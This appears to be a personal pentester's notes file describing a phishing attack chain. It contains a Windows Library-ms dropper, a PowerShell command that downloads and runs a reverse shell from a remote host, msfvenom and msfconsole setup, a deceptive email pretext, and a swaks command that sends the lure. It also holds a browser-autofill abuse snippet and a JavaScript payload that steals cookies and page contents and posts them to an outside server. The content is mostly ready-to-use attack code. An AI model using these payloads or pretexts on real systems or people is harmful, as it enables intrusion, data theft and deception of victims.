<% tp.file.rename("1_phishing")%>


## Creating the Payloads
- 1st stage: config.Library-ms
  This opens our remotely hosted 2nd stage dropper like it was a local folder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://HIP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

- 2nd stage (autoconfig.lnk)
```powershell
powershell.exe -NoExit -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.163:8000/revshell.ps1'); revshell"
```

- 3rd stage
```bash
msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.45.163 LPORT=4444 NOEXIT -f raw -o revshell.ps1
```
>  MUST remove the gibberish from the beginning and end of the file, otherwise the payload won't work

## Setup C2

- Host the 2nd stage via webdav (shell 1)
```bash
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .
```

- Create a copy of the library and use that to transfer those two files to kali
> Always keep an unused version of this library file as it might get unusable once opened

- Host the 3rd stage via HTTP (shell 2)
```bash
python3 -m http.server 8000
```

- Receive reverse shell (shell 3)
```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/powershell_reverse_tcp; set LHOST $hip; set LPORT $hport; set ExitOnSession false; run -j"
```

## Send Phish
- Example contents for body.txt
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

- Shell 4
```bash
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --body @body.txt --header "Subject: Staging Script" --suppress-data --server $ip_mailserver [-au $username -ap $password]
```


# Abuse Browser Autofill
```
await fetch('/users/logout')
let r = await fetch('/users')
document.body.innerHTML = await r.text()
history.replaceState(null, null,'/loginlol')
Form.action = '[https://attacker.com](https://attacker.com)' // dosnt work bc of csp :(
```

# Gather information
```javascript
(function(){
	if(window.name!=='__'){

            try {dcoo = document.cookie} catch(e) {dcoo=null}
            try {inne = document.body.parentNode.innerHTML} catch(e) {inne=null}
            try {durl = document.URL} catch(e) {durl=null}
            try {oloc = opener.location} catch(e) {oloc=null}
            try {oloh = opener.document.body.innerHTML} catch(e) {oloh=null}
            try {odoc = opener.document.cookie} catch(e) {odoc=null}

            var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'form');
			var __= document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
            var body = document.getElementsByTagName('body')[0];

			__.setAttribute('value',escape(dcoo+'\r\n\r\n'+inne+'\r\n\r\n'+durl+'\r\n\r\n'+oloc+'\r\n\r\n'+oloh+'\r\n\r\n'+odoc));
			__.setAttribute('name','_');
			_.appendChild(__);
			_.action='https://cure53.de/m/';
			_.method='post';
            //_.target='_blank';

			body.appendChild(_);
			window.name='__';
			_.submit();
			//history.back();
	} else {window.name=''}
})();
```
Thanks to cure53